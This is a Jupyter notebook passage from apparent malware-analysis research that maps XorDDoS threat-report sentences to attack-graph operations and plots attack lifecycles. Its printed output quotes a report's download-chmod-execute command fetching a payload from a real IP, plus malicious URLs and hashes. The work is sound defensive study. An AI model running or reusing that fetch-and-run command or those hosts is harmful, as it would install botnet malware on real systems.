      "\t<OP 3 act=stat64, obj=/var/>, <OP 5 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP57 act=lseek, obj=/var/run/>, <OP 4 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP58 act=lseek, obj=/var/>, <OP 5 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP49 act=stat64, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP70 act=newfstatat, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP33 act=stat, obj=/run/>, <OP 6 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\t<OP50 act=stat64, obj=/var/run/>, <OP 4 act=read, obj=/var/run/gcc.pid, sent=creates symbolic links which points to the script in /etc/init.d: /etc/rc{1-5}.d/s90{random numbers} /etc/rc.d/rc{1-5}.d/s90{random numbers} get the magic string value from the file /var/run/gcc.pid read the following from its configuration file: md5 - checksum of file denyip - open communication with an ip filename - list of filename rmfile - files to remove>\n",
      "\n",
      "Sample Xorddos-Trendmicro2.csv\n",
      "\tnum of segment in report: 47\n",
      "\tlenght of ctd's OPset is 2\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 1, num of asg objects: 26. R_malObj is 0.0385\n",
      "\t\tctd_object: {'\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 2\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 2, num of asg op: 73. R_malOps is 0.0274\n",
      "\t\trefered lifecycle: [61, 63]\n",
      "\t\tsys_asg_OPset: [<OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP45 act=write, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 8. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP62 act=send, obj=ip_addr>, <OP 1 act=wget, obj=http://122.51.133.49:10086/vip, sent=afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:  wget http://122.51.133.49:10086/vip –o vip chmod 777 vip ./vip the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server.>\n",
      "\t<OP64 act=_newselect, obj=ip_addr>, <OP 2 act=find, obj=http://62.171.160.189/linux_arm, sent= indicators of compromise kaiji  file name\tsha 256\ttrend micro pattern detection 123.sh\t9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8\ttrojan.sh.kaiji.a linux_arm\td315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56\tddos.linux.kaiji.a related urls:  http://62.171.160.189/linux_arm http://62.171.160.189/11/123.sh xorddos and other malware variants found through the same url  sha 256\ttrend micro pattern detection dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3\tbackdoor.linux.xorddos.ae 6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c\tbackdoor.linux.dofloo.ab 286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe\tbackdoor.win32.sddos.a related url:  http://122.51.133.49:10086/vip>\n",
      "\n",
      "\n",
      "OperationPair that changes system resources:\n",
      " [<OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP48 act=rename, obj=/etc/cron>, <OP32 act=lstat, obj=/etc/rc>, <OP22 act=write, obj=/etc/rc>, <OP45 act=write, obj=/etc/sed>, <OP46 act=fchown, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>]\n"
     ]
    }
   ],
   "source": [
    "for sample in samples:\n",
    "    # print(len(sample.OPset)) # 30\n",
    "    # print(len(sample.OPset_ordered)) # 30\n",
    "    # print(set(sample.OPset) - set(sample.OPset_ordered)) # 相減是空的set 都OK\n",
    "    fset = run_family_set_procedure(sample)\n",
    "    # match_sentence_ttlcnt = save_match_sent_to_excel(fset, sample.samplename)\n",
    "    # print(f'match_sentence_ttlcnt is {match_sentence_ttlcnt}\\n---\\n')"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: draw Lifecycle diagram\n",
    "- 兩個 traces (legend) 一般的 OP 和 ChangeSys OP。分兩個顏色，不重疊。\n",
    "- x: [a,a,a,a,b,b,b,c,c,c] 不同 report 的 step 可以放同一個 list，因為屬於同個 trace。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "c:\\Users\\luweb\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\plotly\\io\\_renderers.py:7: DeprecationWarning:\n",
      "\n",
      "The distutils package is deprecated and slated for removal in Python 3.12. Use setuptools or check PEP 632 for potential alternatives\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.plotly.v1+json": {
       "config": {
        "plotlyServerURL": "https://plot.ly"
       },
       "data": [
        {
         "marker": {
          "color": "darkorange",
          "size": 12
         },
         "mode": "markers",
         "name": "Normal Operation Pair",
         "type": "scatter",
         "x": [
          69,
          68,
          1,
          13,
          56,
          41,
          16,
          69,
          3,
          57,
          51,
          68,
          52,
          58,
          1,
          49,
          70,
          33,
          53,
          27,
          50,
          56,
          16,
          3,
          57,
          58,
          49,
          70,
          33,
          50,
          62,
          64,
          1,
          2,
          3,
          4,
          5,
          6,
          7,
          8,
          9,
          10,
          11,
          12,
          19,
          20,
          23,
          24,
          25,
          26,
          27,
          28,
          29,
          30,
          31,
          33,
          34,
          35,
          36,
          37,
          38,
          39,
          40,
          41,
          42,
          49,
          50,
          51,
          52,
          53,
          54,
          55,
          56,
          57,
          58,
          59,
          60,
          61,
          62,
          63,
          64,
          65,
          66,
          67,
          68,
          69,
          70,
          71,
          72,
          73
         ],
         "y": [
          "Intezer (3)",
          "Intezer (3)",
          "Intezer (3)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Microsoft (18)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro (9)",
          "Trendmicro2 (2)",
          "Trendmicro2 (2)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)"
         ]
        },
        {
         "marker": {
          "color": "blue",
          "size": 12
         },
         "mode": "markers",
         "name": "Change SR Operation Pair",
         "type": "scatter",
         "x": [
          13,
          21,
          18,
          47,
          43,
          16,
          48,
          32,
          22,
          45,
          44,
          14,
          46,
          17,
          15
         ],
         "y": [
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)"
         ]
        }
       ],
       "layout": {
        "template": {
         "data": {
          "bar": [
           {
            "error_x": {
             "color": "#2a3f5f"
            },
            "error_y": {
             "color": "#2a3f5f"
            },
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "bar"
           }
          ],
          "barpolar": [
           {
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "barpolar"
           }
          ],
          "carpet": [
           {
            "aaxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "baxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "type": "carpet"
           }
          ],
          "choropleth": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "choropleth"
           }
          ],
          "contour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "contour"
           }
          ],
          "contourcarpet": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "contourcarpet"
           }
          ],
          "heatmap": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmap"
           }
          ],
          "heatmapgl": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmapgl"
           }
          ],
          "histogram": [
           {
            "marker": {
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "histogram"
           }
          ],
          "histogram2d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2d"
           }
          ],
          "histogram2dcontour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2dcontour"
           }
          ],
          "mesh3d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "mesh3d"
           }
          ],
          "parcoords": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "parcoords"
           }
          ],
          "pie": [
           {
            "automargin": true,
            "type": "pie"
           }
          ],
          "scatter": [
           {
            "fillpattern": {
             "fillmode": "overlay",
             "size": 10,
             "solidity": 0.2
            },
            "type": "scatter"
           }
          ],
          "scatter3d": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatter3d"
           }
          ],
          "scattercarpet": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattercarpet"
           }
          ],
          "scattergeo": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergeo"
           }
          ],
          "scattergl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergl"
           }
          ],
          "scattermapbox": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattermapbox"
           }
          ],
          "scatterpolar": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolar"
           }
          ],
          "scatterpolargl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolargl"
           }
          ],
          "scatterternary": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterternary"
           }
          ],
          "surface": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "surface"
           }
          ],
          "table": [
           {
            "cells": {
             "fill": {
              "color": "#EBF0F8"
             },
             "line": {
              "color": "white"
             }
            },
            "header": {
             "fill": {
              "color": "#C8D4E3"
             },
             "line": {
              "color": "white"
             }
            },
            "type": "table"
           }
          ]
         },
         "layout": {
          "annotationdefaults": {
           "arrowcolor": "#2a3f5f",
           "arrowhead": 0,
           "arrowwidth": 1
          },
          "autotypenumbers": "strict",
          "coloraxis": {
           "colorbar": {
            "outlinewidth": 0,
            "ticks": ""
           }
          },
          "colorscale": {
           "diverging": [
            [
             0,
             "#8e0152"
            ],
            [
             0.1,
             "#c51b7d"
            ],
            [
             0.2,
             "#de77ae"
            ],
            [
             0.3,
             "#f1b6da"
            ],
            [
             0.4,
             "#fde0ef"
            ],
            [
             0.5,
             "#f7f7f7"
            ],
            [
             0.6,
             "#e6f5d0"
            ],
            [
             0.7,
             "#b8e186"
            ],
            [
             0.8,
             "#7fbc41"
            ],
            [
             0.9,
             "#4d9221"
            ],
            [
             1,
             "#276419"
            ]
           ],
           "sequential": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ],
           "sequentialminus": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ]
          },
          "colorway": [
           "#636efa",
           "#EF553B",
           "#00cc96",
           "#ab63fa",
           "#FFA15A",
           "#19d3f3",
           "#FF6692",
           "#B6E880",
           "#FF97FF",
           "#FECB52"
          ],
          "font": {
           "color": "#2a3f5f"
          },
          "geo": {
           "bgcolor": "white",
           "lakecolor": "white",
           "landcolor": "#E5ECF6",
           "showlakes": true,
           "showland": true,
           "subunitcolor": "white"
          },
          "hoverlabel": {
           "align": "left"
          },
          "hovermode": "closest",
          "mapbox": {
           "style": "light"
          },
          "paper_bgcolor": "white",
          "plot_bgcolor": "#E5ECF6",
          "polar": {
           "angularaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "radialaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "scene": {
           "xaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "yaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "zaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           }
          },
          "shapedefaults": {
           "line": {
            "color": "#2a3f5f"
           }
          },
          "ternary": {
           "aaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "baxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "caxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "title": {
           "x": 0.05
          },
          "xaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          },
          "yaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          }
         }
        },
        "title": {
         "text": "Lifecycle Diagram of Attack Behavior in Document (Xorddos)"
        },
        "xaxis": {
         "title": {
          "text": "ASG Operation Pair (in steps)"
         }
        },
        "yaxis": {
         "title": {
          "text": "Malware Document"
         }
        }
       }
      }
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# import plotly.express as px\n",
    "import plotly.graph_objects as go\n",
    "\n",
    "def symmetric_difference(list1: list, list2: list) -> list:\n",
    "    ''' return list1 - list2. '''\n",
    "    s = set(list2)\n",
    "    temp3 = [x for x in list1 if x not in s]\n",
    "    return temp3\n",
    "\n",
    "def draw_lifecycle(fset:FamilySet):\n",
    "    familname = fset.familyname\n",
    "    # reportnames = [rem.reportname for rem in fset.rem_lst if len(rem.match_regex)]\n",
    "\n",
    "    fig = go.Figure()\n",
    "    x, y = [], []\n",
    "    x_sys, y_sys = [], []\n",
    "    for i, rem in enumerate(fset.rem_lst):\n",
    "        if len(rem.OPset_order_index) == 0:\n",
    "            continue\n",
    "\n",
    "        numOfDot = len(rem.OPset_order_index)\n",
    "        reportname = rem.reportname.split('.')[0]\n",
    "        reportname = reportname.split('-')[1]\n",
    "        if reportname == \"Ms\":\n",
    "            reportname = \"Microsoft\"\n",
    "        reportname += f' ({numOfDot})'\n",
    "        x_sys.extend(rem.SysOPset_order_index) # 改變系統環境的 OP\n",
    "        y_sys.extend([reportname] * len(rem.SysOPset_order_index))\n",
    "        current_x_normal = symmetric_difference(rem.OPset_order_index, rem.SysOPset_order_index) # 一般的/其餘的 OP\n",
    "        # print(reportname, 'numOfDot', numOfDot, 'rem.OPset_order_index', rem.OPset_order_index)\n",
    "        # print('x_normal', current_x_normal, 'x_sys', rem.SysOPset_order_index)\n",
    "        x.extend(current_x_normal)\n",
    "        y.extend([reportname] * len(current_x_normal))\n",
    "        pass\n",
    "    # todo: add baseline's lifecycle\n",
    "    print()\n",
    "    rowname = f'ASG ({len(fset.sample.OPset)})'\n",
    "    current_x_system = fset.sample.OPset_sysOnly_ordered_index\n",
    "    current_x_normal = symmetric_difference(list(range(len(fset.sample.OPset))), current_x_system) # all steps - sysobj steps\n",
    "    x_sys.extend(current_x_system)\n",
    "    y_sys.extend([rowname] * len(current_x_system)) \n",
    "    x.extend(current_x_normal)\n",
    "    y.extend([rowname] * len(current_x_normal))\n",
    "    # print(rowname, len(fset.sample.OPset), len(current_x_system), len(current_x_normal))\n",
    "    \n",
    "    # normal OPs\n",
    "    x = [idx+1 for idx in x] # add 1 to each asg index\n",
    "    fig.add_trace(go.Scatter(\n",
    "        x=x,\n",
    "        y=y,\n",
    "        marker=dict(color=\"darkorange\", size=12),\n",
    "        mode=\"markers\",\n",
    "        name=\"Normal Operation Pair\",\n",
    "    ))\n",
    "\n",
    "    # changeSysObj OPs\n",
    "    x_sys = x = [idx+1 for idx in x_sys]\n",
    "    fig.add_trace(go.Scatter(\n",
    "        x=x_sys,\n",
    "        y=y_sys,\n",
    "        marker=dict(color=\"blue\", size=12),\n",
    "        mode=\"markers\",\n",
    "        name=\"Change SR Operation Pair\",\n",
    "    ))\n",
    "\n",
    "    fig.update_layout(title=f\"Lifecycle Diagram of Attack Behavior in Document ({familname})\",\n",
    "                    xaxis_title=\"ASG Operation Pair (in steps)\",\n",
    "                    yaxis_title=\"Malware Document\")\n",
    "    fig.show()\n",
    "    pass\n",
    "\n",
    "draw_lifecycle(fset)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: draw ASG & CTD's OP graph\n",
    "- 完整的 ASG OPset graph\n",
    "- 每篇報告的 CTD OPset (完整和matched兩種)，以及對應部分的 ASG。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['b', 'c', 'd']"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = [1,2,3]\n",
    "b = ['a','b','c','d','e']\n",
    "[b[i] for i in a]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Title: Xorddos_asg_OPset Pages: 1 -->\n<svg width=\"5200pt\" height=\"291pt\"\n viewBox=\"0.00 0.00 5199.93 291.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 287)\">\n<title>Xorddos_asg_OPset</title>\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-287 5195.93,-287 5195.93,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2615.69\" cy=\"-265\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2615.69\" y=\"-261.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"72.69\" cy=\"-178\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"72.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.28,-263.7C2107.84,-261.92 27.52,-252.14 4.69,-229 -8.43,-215.7 8.38,-203.25 28.56,-194.1\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"30.12,-197.24 37.98,-190.14 27.4,-190.79 30.12,-197.24\"/>\n<text text-anchor=\"middle\" x=\"27.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.open</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.27,-263.66C2114.69,-261.71 96.1,-251.28 73.69,-229 67.74,-223.08 66.14,-214.5 66.45,-206.12\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"69.93,-206.51 67.62,-196.17 62.98,-205.69 69.93,-206.51\"/>\n<text text-anchor=\"middle\" x=\"96.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">14.lseek</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.44,-264.01C2134.05,-263.94 274.85,-261.8 157.69,-229 137.1,-223.24 116.37,-211.2 100.54,-200.38\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"102.47,-197.45 92.28,-194.54 98.43,-203.17 102.47,-197.45\"/>\n<text text-anchor=\"middle\" x=\"180.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" 